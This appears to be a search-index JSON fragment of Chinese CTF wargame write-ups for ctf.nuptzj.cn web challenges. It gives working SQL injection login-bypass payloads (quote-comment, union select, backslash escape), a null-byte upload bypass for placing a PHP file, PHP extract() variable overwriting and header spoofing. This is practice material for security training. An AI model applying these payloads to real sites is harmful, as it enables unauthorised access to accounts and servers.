            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao2/#_2", 
            "text": "检查可能做访问控制的参数，maxlength=10  而口令zhimakaimen长度为11，所以确定该题目需要bp截获提交修改post中的数据", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao2/#_3", 
            "text": "略", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao2/#_4", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao2/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "待实现"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_1/", 
            "text": "SQL注入1\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#SQL%E6%B3%A8%E5%85%A51\n\n\n听说你也会注入？ \n\n\n\n\n解答思路\n\n\n\n\n需要注意的是需要添加\n)\n\n\n\n\n解题步骤\n\n\n\n\n在登录框中输入用户名和密码，post提交，hackbar加载，其数据如下：\n\n\n\n\nhttp\n   user=admin\npw=password\n\n\n\n\n修改user数据提交，如下\n\n\n\n\nhttp\n   user=admin')#\npw=password\n\n\n得到flag\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "[ctf.nuptzj.cn] sql injection 1"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_1/#sql1", 
            "text": "", 
            "title": "SQL注入1"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_1/#_1", 
            "text": "http://ctf.nuptzj.cn/challenges#SQL%E6%B3%A8%E5%85%A51  听说你也会注入？", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_1/#_2", 
            "text": "需要注意的是需要添加 )", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_1/#_3", 
            "text": "在登录框中输入用户名和密码，post提交，hackbar加载，其数据如下：   http\n   user=admin pw=password   修改user数据提交，如下   http\n   user=admin')# pw=password  得到flag", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_1/#_4", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_1/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_2/", 
            "text": "SQL INJECTION 2\n\n\n题目\n\n\n\n\nhttp://4.chinalover.sinaapp.com/web6/index.php\n\n\n```php+HTML\n\n\n\n\nSecure Web Login II\n\n\n\n\n\n?php\nif($_POST[user] \n $_POST[pass]) {\n   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\n  mysql_select_db(SAE_MYSQL_DB);\n  $user = $_POST[user];\n  $pass = md5($_POST[pass]);\n  $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\"));\n  if (($query[pw]) \n (!strcasecmp($pass, $query[pw]))) {\n      echo \"\nLogged in! Key: ntcf{\n*\n*\n} \n\";\n  }\n  else {\n    echo(\"\nLog in failure!\n\");\n  }\n}\n?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSource\n\n\n\n```\n\n\n\n\n解答思路\n\n\n\n\nstrcasecmp\n比较两个字符串是否相等，如果相等，则返回0，不相等则返回非0值；\n\n\nphp源码要求查询出的pw值和传入的pw值相等，所以，需要将原sql语句的返回值改为与传入的pw值相等，所以，需要将原结果清空，然后使用union select返回自己想要的值\n\n\n\n\n解题步骤\n\n\n\n\n在hackbar中提交post数据：\n\n\n\n\nmssql\n   user=admin' and 1=2 union select md5(1)%23\npass=1\n\n\n得到flag\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "SQL INJECTION 2"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_2/#sql-injection-2", 
            "text": "", 
            "title": "SQL INJECTION 2"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_2/#_1", 
            "text": "http://4.chinalover.sinaapp.com/web6/index.php  ```php+HTML  \nSecure Web Login II   ?php\nif($_POST[user]   $_POST[pass]) {\n   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\n  mysql_select_db(SAE_MYSQL_DB);\n  $user = $_POST[user];\n  $pass = md5($_POST[pass]);\n  $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\"));\n  if (($query[pw])   (!strcasecmp($pass, $query[pw]))) {\n      echo \" Logged in! Key: ntcf{ * * }  \";\n  }\n  else {\n    echo(\" Log in failure! \");\n  }\n}\n?        Source  \n```", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_2/#_2", 
            "text": "strcasecmp 比较两个字符串是否相等，如果相等，则返回0，不相等则返回非0值；  php源码要求查询出的pw值和传入的pw值相等，所以，需要将原sql语句的返回值改为与传入的pw值相等，所以，需要将原结果清空，然后使用union select返回自己想要的值", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_2/#_3", 
            "text": "在hackbar中提交post数据：   mssql\n   user=admin' and 1=2 union select md5(1)%23 pass=1  得到flag", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_2/#_4", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_2/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_4/", 
            "text": "sql injection 4\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#sql%20injection%204\n\n\n```php+HTML\n\n?php\n\n\nGOAL: login as admin,then get the flag;\n\n\nerror_reporting(0);\nrequire 'db.inc.php';\n\n\nfunction clean($str){\n  if(get_magic_quotes_gpc()){\n      $str=stripslashes($str);\n  }\n  return htmlentities($str, ENT_QUOTES);\n}\n\n\n$username = @clean((string)$_GET['username']);\n$password = @clean((string)$_GET['password']);\n\n\n$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';\n$result=mysql_query($query);\nif(!$result || mysql_num_rows($result) \n 1){\n  die('Invalid password!');\n}\n\n\necho $flag;\n?\n\n```\n\n\n\n\n解答思路\n\n\n\n\n\n\n一般sql注入的思路是在输入中加入\n’\n,达到闭合前面查询条件的目的，但是由于\nhtmlentities($str, ENT_QUOTES)\n方法的存在，会将所有的html标签转义，并且将\n'\n和\n\"\n都转义掉，所以，没有办法使用添加\n'\n的办法来实现跳出闭合；\n\n\n\n\n\n\n这里使用了转义字符在\nhtmlentities\n中未被转义这一点，来实现跳出查询语句闭合，从而让mysql将自己的输入作为sql语句来执行\n\n\n\n\n\n\n\n\n代码中使用了htmlentities对单引号进行了转换，所以我们不能通过单引号来闭合sql语句了，根据提示，可以通过反斜杠来吃掉单引号，即对单引号进行转义 \n\n\n\n\n解题步骤\n\n\n\n\nurl后面添加\n?username=admin\\\npassword=or 1%23\n，提交，得到flag\n\n\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "sql injection 4"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_4/#sql-injection-4", 
            "text": "", 
            "title": "sql injection 4"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_4/#_1", 
            "text": "http://ctf.nuptzj.cn/challenges#sql%20injection%204  ```php+HTML ?php", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_4/#goal-login-as-adminthen-get-the-flag", 
            "text": "error_reporting(0);\nrequire 'db.inc.php';  function clean($str){\n  if(get_magic_quotes_gpc()){\n      $str=stripslashes($str);\n  }\n  return htmlentities($str, ENT_QUOTES);\n}  $username = @clean((string)$_GET['username']);\n$password = @clean((string)$_GET['password']);  $query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';\n$result=mysql_query($query);\nif(!$result || mysql_num_rows($result)   1){\n  die('Invalid password!');\n}  echo $flag;\n? \n```", 
            "title": "GOAL: login as admin,then get the flag;"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_4/#_2", 
            "text": "一般sql注入的思路是在输入中加入 ’ ,达到闭合前面查询条件的目的，但是由于 htmlentities($str, ENT_QUOTES) 方法的存在，会将所有的html标签转义，并且将 ' 和 \" 都转义掉，所以，没有办法使用添加 ' 的办法来实现跳出闭合；    这里使用了转义字符在 htmlentities 中未被转义这一点，来实现跳出查询语句闭合，从而让mysql将自己的输入作为sql语句来执行     代码中使用了htmlentities对单引号进行了转换，所以我们不能通过单引号来闭合sql语句了，根据提示，可以通过反斜杠来吃掉单引号，即对单引号进行转义", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_4/#_3", 
            "text": "url后面添加 ?username=admin\\ password=or 1%23 ，提交，得到flag", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_4/#_4", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_sql_injection_4/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_upload_file/", 
            "text": "上传绕过\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87 \n\n\n提示:猜猜代码怎么写的 \n\n\n\n\n解答思路\n\n\n\n\n0x00截断\n\n\n\n\n\n\n0x00截断，00截断是将上传文件名或路径名中使用ascll码值为0的字符（也就是null）来进行截断\n\n\n%00一般用在URL中用于截断url来进行文件包含，两者原理都一样，都是ascll为0的字符，只是形式不同而已。\n\n\n\n\nphp\n  \n% \n  path=\"upfiles/picture/\" \n  file=\"XXX.jpg\" \n  upfilename=path \n file '最后的上传地址 \n  %\n\n  大家应该能清楚的看懂这个意思，path为上传的路径，file是生成的文件名，而upfilename则是最终上传后路径，试想一下，如果path是用户可以控制的，那么截断漏洞就产生了。比如我更改的path为upfiles/picture/1.aspchr(0)\nXXX.jpg,chr(0)会忽略后面的东西，看看，upfiles/picture/1.asp，很熟悉吧一个webshell就这样诞生了。\n\n\n\n\n本题无法在文件名处截断，只有文件夹路径可以用来截断，同时需要将文件名的后缀修改为合法值来通过过滤\n\n\n\n\n解题步骤\n\n\n\n\n设置bp拦截，上传文件，得到原始发送请求\n\n\n\n\n```http\n   POST /web5/21232f297a57a5a743894a0e4a801fc3/upload.php HTTP/1.1\n   Host: teamxlc.sinaapp.com\n   Proxy-Connection: keep-alive\n   Content-Length: 386\n   Cache-Control: max-age=0\n   Origin: http://teamxlc.sinaapp.com\n\n\nAccept-Encoding: gzip, deflate\n   Accept-Language: zh-CN,zh;q=0.9\n\n\n------WebKitFormBoundaryBsjUFBJGSNjbqTOl\n   Content-Disposition: form-data; name=\"dir\"\n\n\n/uploads/\n   ------WebKitFormBoundaryBsjUFBJGSNjbqTOl\n   Content-Disposition: form-data; name=\"file\"; filename=\"php.php\"\n   Content-Type: application/octet-stream\n\n\n------WebKitFormBoundaryBsjUFBJGSNjbqTOl\n   Content-Disposition: form-data; name=\"submit\"\n\n\nSubmit\n   ------WebKitFormBoundaryBsjUFBJGSNjbqTOl--\n   ```\n\n\n\n\n修改post请求\n\n\n\n\n将\n/uploads/\n修改为：\n/uploads/php.php\n，并在16进制状态下，将空格20修改为00\n\n\n将\nfilename=\"php.php\"\n修改为\nfilename=\"php.php.jpg\"\n\n\n\n\n提交后得到flag\n\n\n\n\n\n\nflag:nctf{welcome_to_hacks_world} \n\n\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "上传绕过"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_upload_file/#_1", 
            "text": "", 
            "title": "上传绕过"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_upload_file/#_2", 
            "text": "http://ctf.nuptzj.cn/challenges#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87   提示:猜猜代码怎么写的", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_upload_file/#_3", 
            "text": "0x00截断    0x00截断，00截断是将上传文件名或路径名中使用ascll码值为0的字符（也就是null）来进行截断  %00一般用在URL中用于截断url来进行文件包含，两者原理都一样，都是ascll为0的字符，只是形式不同而已。   php\n   % \n  path=\"upfiles/picture/\" \n  file=\"XXX.jpg\" \n  upfilename=path   file '最后的上传地址 \n  % \n  大家应该能清楚的看懂这个意思，path为上传的路径，file是生成的文件名，而upfilename则是最终上传后路径，试想一下，如果path是用户可以控制的，那么截断漏洞就产生了。比如我更改的path为upfiles/picture/1.aspchr(0) XXX.jpg,chr(0)会忽略后面的东西，看看，upfiles/picture/1.asp，很熟悉吧一个webshell就这样诞生了。   本题无法在文件名处截断，只有文件夹路径可以用来截断，同时需要将文件名的后缀修改为合法值来通过过滤", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_upload_file/#_4", 
            "text": "设置bp拦截，上传文件，得到原始发送请求   ```http\n   POST /web5/21232f297a57a5a743894a0e4a801fc3/upload.php HTTP/1.1\n   Host: teamxlc.sinaapp.com\n   Proxy-Connection: keep-alive\n   Content-Length: 386\n   Cache-Control: max-age=0\n   Origin: http://teamxlc.sinaapp.com  Accept-Encoding: gzip, deflate\n   Accept-Language: zh-CN,zh;q=0.9  ------WebKitFormBoundaryBsjUFBJGSNjbqTOl\n   Content-Disposition: form-data; name=\"dir\"  /uploads/\n   ------WebKitFormBoundaryBsjUFBJGSNjbqTOl\n   Content-Disposition: form-data; name=\"file\"; filename=\"php.php\"\n   Content-Type: application/octet-stream  ------WebKitFormBoundaryBsjUFBJGSNjbqTOl\n   Content-Disposition: form-data; name=\"submit\"  Submit\n   ------WebKitFormBoundaryBsjUFBJGSNjbqTOl--\n   ```   修改post请求   将 /uploads/ 修改为： /uploads/php.php ，并在16进制状态下，将空格20修改为00  将 filename=\"php.php\" 修改为 filename=\"php.php.jpg\"   提交后得到flag    flag:nctf{welcome_to_hacks_world}", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_upload_file/#_5", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_upload_file/#_6", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_url_redirect/", 
            "text": "URL跳转\n\n\n题目\n\n\n\n\nhttp://chinalover.sinaapp.com/web9/\n\n\n\n\n\n解答思路\n\n\n\n\n存在网址重定向（\n302  Location\n），考虑flag隐藏在重定向网页中\n\n\n\n\n解题步骤\n\n\n\n\n使用bp拦截：点击超链接，访问\n地址\n：\n\n\n\n\n\n\nhttp://chinalover.sinaapp.com/web9/\n\n\n\n\n\n\n在bp history中查看，得到结果\n\n\n\n\nhttp\n   HTTP/1.1 302 Found\n   Server: nginx\n   Date: Wed, 11 Jul 2018 08:16:36 GMT\n   Content-Type: text/html\n   Content-Length: 0\n   Connection: keep-alive\n   flag: nctf{this_is_302_redirect}\n   Location: http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php\n   Via: 1565\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "URL跳转"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_url_redirect/#url", 
            "text": "", 
            "title": "URL跳转"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_url_redirect/#_1", 
            "text": "http://chinalover.sinaapp.com/web9/", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_url_redirect/#_2", 
            "text": "存在网址重定向（ 302  Location ），考虑flag隐藏在重定向网页中", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_url_redirect/#_3", 
            "text": "使用bp拦截：点击超链接，访问 地址 ：    http://chinalover.sinaapp.com/web9/    在bp history中查看，得到结果   http\n   HTTP/1.1 302 Found\n   Server: nginx\n   Date: Wed, 11 Jul 2018 08:16:36 GMT\n   Content-Type: text/html\n   Content-Length: 0\n   Connection: keep-alive\n   flag: nctf{this_is_302_redirect}\n   Location: http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php\n   Via: 1565", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_url_redirect/#_4", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_url_redirect/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_var_override/", 
            "text": "变量覆盖\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96\n\n\nview-source:\n\n\nphp\n\n?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") { ?\n\n                        \n?php\n                        extract($_POST);\n                        if ($pass == $thepassword_123) { ?\n\n                            \ndiv class=\"alert alert-success\"\n\n                                \ncode\n?php echo $theflag; ?\n/code\n\n                            \n/div\n\n                        \n?php } ?\n\n                    \n?php } ?\n\n\n\n\n解答思路\n\n\n\n\n\n\n参看：http://www.01happy.com/php-extract-use-and-suggestions/\n\n\n\n\n\n\nphp中的extract方法可以将数组中的数据转换到当前上下文环境，其中key作为变量名，value作为变量的值。示例代码：\n\n\n\n\n\n\n```php\n  $user = array(\n      'name' =\n 'tom'\n      ,'age' =\n 20\n  );   \n\n\nextract($user);\n  echo $name; //输出tom\n  echo $age; //输出20\n  ```\n\n\n但是这样获取变量的方式比较隐秘，用一句俗话来说就是藏的很深，我个人认为不利于代码阅读。比如下面代码：\n\n\n```php\n  $name = 'anny';\n  $user = array(\n      'name' =\n 'tom'\n  );   \n\n\nextract($user);\n  echo $name; //输出tom\n  ```\n\n\n$name在初始的时候被赋值为anny，但是经过extract后，$name就变成了tom，初始的赋值被覆盖了。这边代码比较简单还容易看的出来，如果是在比较复杂的代码里，有时就会纳闷了——到底哪里对$name进行重新赋值了？为什么搜索$name这个变量都搜索不到重新赋值的地方？\n\n\n解题步骤\n\n\n\n\n在http://chinalover.sinaapp.com/web18/的password框中提交\nd\n\n\nbp拦截，修改post参数为：\npass=1\nthepassword_123=1\n\n\n得到结果\n\n\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "变量覆盖"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_var_override/#_1", 
            "text": "", 
            "title": "变量覆盖"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_var_override/#_2", 
            "text": "http://ctf.nuptzj.cn/challenges#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96  view-source:  php ?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") { ? \n                         ?php\n                        extract($_POST);\n                        if ($pass == $thepassword_123) { ? \n                             div class=\"alert alert-success\" \n                                 code ?php echo $theflag; ? /code \n                             /div \n                         ?php } ? \n                     ?php } ?", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_var_override/#_3", 
            "text": "参看：http://www.01happy.com/php-extract-use-and-suggestions/    php中的extract方法可以将数组中的数据转换到当前上下文环境，其中key作为变量名，value作为变量的值。示例代码：    ```php\n  $user = array(\n      'name' =  'tom'\n      ,'age' =  20\n  );     extract($user);\n  echo $name; //输出tom\n  echo $age; //输出20\n  ```  但是这样获取变量的方式比较隐秘，用一句俗话来说就是藏的很深，我个人认为不利于代码阅读。比如下面代码：  ```php\n  $name = 'anny';\n  $user = array(\n      'name' =  'tom'\n  );     extract($user);\n  echo $name; //输出tom\n  ```  $name在初始的时候被赋值为anny，但是经过extract后，$name就变成了tom，初始的赋值被覆盖了。这边代码比较简单还容易看的出来，如果是在比较复杂的代码里，有时就会纳闷了——到底哪里对$name进行重新赋值了？为什么搜索$name这个变量都搜索不到重新赋值的地方？", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_var_override/#_4", 
            "text": "在http://chinalover.sinaapp.com/web18/的password框中提交 d  bp拦截，修改post参数为： pass=1 thepassword_123=1  得到结果", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_var_override/#_5", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_var_override/#_6", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_web3/", 
            "text": "层层递进\n\n\n题目\n\n\n\n\nhttp://chinalover.sinaapp.com/web3/\n\n\n\n\n\n解答思路\n\n\n\n\n层层递进，暗示iframe多层嵌套 \n\n\n\n\n\n\nSO.html-\nS0.html-\nSO.htm-\nS0.htm--\n404.html \n\n\n\n\n\n\n找到404页面，在script中提取\n\n\n\n\n\n\njavascript\n\n!--  \n\nscript src=\"./js/jquery-n.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-c.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-t.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-f.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-{.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-t.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-h.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-i.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-s.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-_.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-i.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-s.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-_.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-a.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-_.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-f.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-l.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-4.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-g.7.2.min.js\"\n/script\n\n\nscript src=\"./js/jquery-}.7.2.min.js\"\n/script\n\n--\n\n\n\n\n\n\n由于题目采用了分离隐藏flag的方式，未想到如何自动检测该类型的flag\n\n\n\n\n解题步骤\n\n\n\n\nlinux命令提取flag\n\n\n\n\nshell\n  cat web3.txt | cut -d - -f 2| cut -d . -f 1| tr -d '\\n' \n web3_flag.txt\n\n\nps:web3.txt的内容为上述script\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "层层递进"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_web3/#_1", 
            "text": "", 
            "title": "层层递进"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_web3/#_2", 
            "text": "http://chinalover.sinaapp.com/web3/", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_web3/#_3", 
            "text": "层层递进，暗示iframe多层嵌套     SO.html- S0.html- SO.htm- S0.htm-- 404.html     找到404页面，在script中提取    javascript !--   script src=\"./js/jquery-n.7.2.min.js\" /script  script src=\"./js/jquery-c.7.2.min.js\" /script  script src=\"./js/jquery-t.7.2.min.js\" /script  script src=\"./js/jquery-f.7.2.min.js\" /script  script src=\"./js/jquery-{.7.2.min.js\" /script  script src=\"./js/jquery-t.7.2.min.js\" /script  script src=\"./js/jquery-h.7.2.min.js\" /script  script src=\"./js/jquery-i.7.2.min.js\" /script  script src=\"./js/jquery-s.7.2.min.js\" /script  script src=\"./js/jquery-_.7.2.min.js\" /script  script src=\"./js/jquery-i.7.2.min.js\" /script  script src=\"./js/jquery-s.7.2.min.js\" /script  script src=\"./js/jquery-_.7.2.min.js\" /script  script src=\"./js/jquery-a.7.2.min.js\" /script  script src=\"./js/jquery-_.7.2.min.js\" /script  script src=\"./js/jquery-f.7.2.min.js\" /script  script src=\"./js/jquery-l.7.2.min.js\" /script  script src=\"./js/jquery-4.7.2.min.js\" /script  script src=\"./js/jquery-g.7.2.min.js\" /script  script src=\"./js/jquery-}.7.2.min.js\" /script \n--    由于题目采用了分离隐藏flag的方式，未想到如何自动检测该类型的flag", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_web3/#_4", 
            "text": "linux命令提取flag   shell\n  cat web3.txt | cut -d - -f 2| cut -d . -f 1| tr -d '\\n'   web3_flag.txt  ps:web3.txt的内容为上述script", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_web3/#_5", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_web3/#_6", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_where_are_you_come_from/", 
            "text": "你从哪里来\n\n\n题目\n\n\n\n\n你从哪里来\n\n\nhttp://chinalover.sinaapp.com/web22/\n\n\n\n\n解答思路\n\n\n\n\n通过从哪里来，得到解题思路\n\n\n\n\n解题步骤\n\n\n\n\n使用bp拦截：点击超链接，访问\n地址\n：\n\n\n\n\n\n\nhttp://chinalover.sinaapp.com/web22/\n\n\n\n\n\n\n修改referer为\n\n\n\n\nhttp\n   Referer: http://www.google.com\n\n\n\n\n本地思路正确，但估计答题系统的问题，未得到正确答案\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "你从哪里来"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_where_are_you_come_from/#_1", 
            "text": "", 
            "title": "你从哪里来"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_where_are_you_come_from/#_2", 
            "text": "你从哪里来  http://chinalover.sinaapp.com/web22/", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_where_are_you_come_from/#_3", 
            "text": "通过从哪里来，得到解题思路", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_where_are_you_come_from/#_4", 
            "text": "使用bp拦截：点击超链接，访问 地址 ：    http://chinalover.sinaapp.com/web22/    修改referer为   http\n   Referer: http://www.google.com   本地思路正确，但估计答题系统的问题，未得到正确答案", 
            "title": "解题步骤"
        }, 
